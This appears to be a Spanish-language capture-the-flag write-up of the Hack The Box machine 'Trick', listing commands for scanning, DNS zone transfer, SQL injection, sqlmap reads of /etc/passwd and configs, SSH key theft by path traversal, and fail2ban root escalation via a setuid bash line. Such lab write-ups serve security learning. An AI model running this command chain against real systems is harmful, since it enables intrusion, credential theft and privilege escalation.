---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Trick              |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.11.166       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Trick/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.38.26
```

![nmap 1](/assets/images/Trick/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.38.26 -oG allPorts
```

![nmap2](/assets/images/Trick/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,25,53,80 10.129.38.26 -oN targeted
```

![nmap3](/assets/images/Trick/nmap3.png)

Intentemos ver a donde mas se direccionan los paquetes con el dns del puerto 53 con el comando:

```s
sudo dig @10.129.71.116 trick.htb axfr
sudo dig @10.129.71.116 preprod-payroll.trick.htb axfr
sudo dig @10.129.71.116 root.trick.htb axfr
```

Hemos encontrado mas dominios potenciales, pero para que no se nos escape ninguno, agregaremos un filtrado con:

```s
sudo dig @10.129.71.116 trick.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' '
```

```s
sudo cat urls | feroxbuster --auto-tune --extract-links --random-agent --stdin --output trick.feroxbuster --threads 100 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```s
wfuzz -c --hc=404 --hw=55,83 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.trick.htb" http://10.129.71.116
```

Para el dominio preprod-payroll.trick.htb, hay un loggin page. El cual intentaremos cruzar con un SQLI con burpsuite de la siguiente forma:

![SQLI](/assets/images/Trick/SQLI.png)

Una vez dentro, tenemos acceso como administrador. Veamos que podemos encontrar aqui.
En el apartado de users, en la opcion de editar las configuraciones del usuario, la contrasena no es visible pero si inspeccionamos el codigo de la pagina, podremos verla.

![user password](/assets/images/Trick/user_psswd.png)

value="SuperGucciRainbowCake"

Sigamos enumerando informacion con sqlmap ahora.

Agregamos un usuario de prueba y lo interceptamos con burp. 

```s
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --username
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/hostname
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/passwd
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --current-user
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --tables
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --os-shell
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --second-order "http://trick.htb"
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --dbs
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --all
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 -D payroll_db -T users --columns
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 -D payroll_db -T users -C id,name,password,username --dump
#Dump column
users
```

Una vez que tenemos el archivo etc/passwd, para filtrar los usuarios existentes podemos hacer un:

```s
cat _etc_passwd | grep sh$
```

![users](/assets/images/Trick/users.png)

Para intentar entrar por fuerza bruta con ssh, usaremos:

```s
sudo crackmapexec ssh 10.10.11.166 -u users -p password
```

Como no se pudo entrar con las credenciales anteriores, intentaremos enumerar mas informacion:

```s
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/nginx.conf
sqlmap -r add-employee.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/sites-enabled/default
```

![ngnix](/assets/images/Trick/ngnx.png)

Encontramos ahora otro subdominio http://preprod-marketing.trick.htb/.
Para entender un poco como funciona, de igual forma con sqlmap podemos traernos el index de /var/www/market/index.js y veremos que para el desplazamiento de paginas, hace una redireccion, asi que podremos hacer un path trasversal de la siguiente manera:

![path test](/assets/images/Trick/path_test.png)

Con este metodo podemos llegar a la flag de usuario

Despues para poder conectarnos remotamente, sera necesario acceder al directorio del /.ssh/id_rsa y copiarnoslo para poder entrar con esa llave privada.

![michael_own](/assets/images/Trick/michael_own.png)

Ahora en el Escritorio, encontramos un script que hace una llamada a una aplicacion llamada fail2ban. Tambien con un sudo -l podemos ver que se tiene permiso como root para este usuario para ejecutar la aplicacion en el reinicio. Y de acuerdo con el <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">articulo</a> lo siguiente seria hacer:

Lo primero sera ir al archivo que se encuentra dentro de /etc/fail2ban/actions.d/iptables-multiport.conf y modificarlo, en la linea de actionunban= o actiontoban= ,como es muy tedioso por usar el vi y por que se borran los archivos. 

```s
chmod u+s /bin/bash
```

Despues solamente tenemos que reiniciar el servicio, y al mismo tiempo usar potator de la manera siguiente:

```s
sudo /etc/init.d/fail2ban restart
```

```s
patator ssh_login host=10.10.11.166 user=FILE0 password=FILE1 0=/usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt 1=/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt```

Despues solamente habra que hacer un:

```s
bash -p
```

Y habremos ganado el root

![root](/assets/images/Trick/root.png)

![Powned](/assets/images/Trick/powned.png)